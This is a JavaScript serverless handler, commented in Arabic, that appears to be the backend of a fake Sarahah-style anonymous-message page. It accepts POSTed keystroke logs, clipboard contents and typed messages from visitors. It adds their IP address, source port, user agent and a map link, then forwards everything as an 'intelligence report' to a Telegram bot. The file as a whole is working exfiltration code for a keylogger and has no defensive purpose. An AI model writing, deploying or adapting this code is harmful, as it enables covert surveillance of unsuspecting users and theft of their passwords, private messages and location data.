export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Not Allowed');

    const data = req.body;
    const token = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    // --- استخراج البيانات الاستخبارية (Intelligence Gathering) ---
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
    
    // استخراج الـ Source Port الحقيقي للطلب
    const sourcePort = req.socket.remotePort || "غير محدد";
    
    // تسجيل الوقت بتوقيت القاهرة
    const timestamp = new Date().toLocaleString('ar-EG', { 
        timeZone: 'Africa/Cairo',
        hour12: true 
    });

    // بناء التقرير بصيغة Markdown احترافية
    let report = `🚨 **FULL INTELLIGENCE REPORT** 🚨\n`;
    report += `━━━━━━━━━━━━━━━━━━\n`;
    report += `🌐 **IP:** \`${ip}\`\n`;
    report += `🔌 **Source Port:** \`${sourcePort}\`\n`;
    report += `📅 **Time:** \`${timestamp}\`\n`;
    report += `🌍 **Location:** [عرض الموقع](https://www.google.com/maps/search/?api=1&query=${ip})\n`;
    report += `━━━━━━━━━━━━━━━━━━\n`;

    // تمييز محتوى الرسالة
    if (data.type === "keystroke") {
        report += `⌨️ **Keylog captured:**\n\`${data.content}\`\n`;
    } else if (data.type === "clipboard") {
        report += `📋 **Clipboard text:**\n\`${data.content}\`\n`;
    } else if (data.type === "final_message") {
        report += `📝 **Final Sarahah Msg:**\n\`${data.content}\`\n`;
    }

    report += `━━━━━━━━━━━━━━━━━━\n`;
    report += `📱 **User Agent:** \`${req.headers['user-agent']}\`\n`;
    report += `🔗 **URL:** ${data.url}\n`;
    report += `━━━━━━━━━━━━━━━━━━`;

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: report,
                parse_mode: "Markdown"
            })
        });
        res.status(200).json({ status: 'success' });
    } catch (e) {
        res.status(500).send('Error in sending');
    }
}
